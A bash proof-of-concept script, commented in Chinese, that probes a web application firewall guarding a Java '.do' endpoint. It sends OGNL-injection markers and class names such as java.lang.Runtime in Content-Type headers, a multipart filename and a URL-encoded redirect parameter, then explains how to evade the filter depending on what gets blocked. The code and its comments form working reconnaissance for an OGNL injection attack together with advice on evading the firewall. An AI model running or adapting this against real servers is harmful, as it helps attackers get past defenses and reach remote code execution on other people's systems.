#!/bin/bash
# waf_sig_ladder.sh —— 定位边缘 WAF 到底拦哪个 token（分隔符 vs 关键字）
# 用法: ./waf_sig_ladder.sh https://target/path.do
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./poc.sh <https://target/path.do>\n' >&2; exit 1; fi
U="$1"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36'

t(){ # $1=label  $2=Content-Type
  local r srv b
  r=$(curl -sS --max-time 15 -A "$UA" -X POST "$U" -H "Content-Type: $2" --data-binary 'x' \
        -o /tmp/wb -D /tmp/wh -w '%{http_code}|%{size_download}')
  srv=$(grep -i '^server:' /tmp/wh | tr -d '\r' | cut -d' ' -f2-)
  b=$(head -c 60 /tmp/wb | tr -d '\n')
  printf '%-42s | %-10s | server=%-10s | %s\n' "$1" "$r" "$srv" "$b"
  sleep 0.8
}

# ---- Control：必须放行，否则后面全部无效 ----
t 'C0 正常 multipart'                'multipart/form-data; boundary=----x'
t 'C1 正常 json'                     'application/json'

# ---- 分隔符探测 ----
t 'S1 %{1+1}'                        '%{1+1}'
t 'S2 ${1+1}'                        '${1+1}'
t 'S3 multipart+boundary=%{1}'       'multipart/form-data; boundary=%{1}'
t 'S4 #{1+1}'                        '#{1+1}'

# ---- 关键字探测（判断是否关键字黑名单）----
t 'K1 boundary=java.lang.ProcessBuilder' 'multipart/form-data; boundary=java.lang.ProcessBuilder'
t 'K2 boundary=ognl.OgnlContext'         'multipart/form-data; boundary=ognl.OgnlContext'
t 'K3 boundary=java.lang.Runtime'        'multipart/form-data; boundary=java.lang.Runtime'
t 'K4 boundary=Runtime.getRuntime'       'multipart/form-data; boundary=Runtime.getRuntime'

# ---- 注入点探测（同一 payload 换位置）----
# Content-Disposition:
curl -sS -X POST "$U" -H 'Content-Type: multipart/form-data; boundary=----x' \
  --data-binary $'------x\r\nContent-Disposition: form-data; name="f"; filename="%{1+1}"\r\n\r\nz\r\n------x--\r\n' \
  -o /dev/null -D - -w 'D1 filename=%{1+1} -> %{http_code}|%{size_download}\n' | tail -1
# URL 编码分隔符:
curl -sS "$U?redirect:%24%7B1%2B1%7D" -o /dev/null -D - -w 'D2 url %24%7B -> %{http_code}|%{size_download}\n' | tail -1

# ===== 判读 =====
# 如果 S1/S2 被拦而 K1-K4 放行 → WAF 拦的是"OGNL 模板分隔符"，不是关键字。
#   ⇒ 拆词/大小写/注释混淆这类"关键字绕过"全部无效，只有改分隔符/换注入点有意义。
# 如果 S1/S2 放行而 K1-K4 被拦 → 关键字黑名单。
#   ⇒ 可用 OGNL 字符串拼接、等价类名、大小写（类名区分大小写，慎用）绕过。
# 如果 D1 放行 → Content-Disposition 是没被检查的备用注入点。
# 如果 D2 放行 → WAF 不做 URL 解码，可用 %24%7B 直接过。
# 如果连 C0/C1 都被拦 → 目标根本不是 WAF 拦这个，而是路径/方法整体被 deny，此路不通。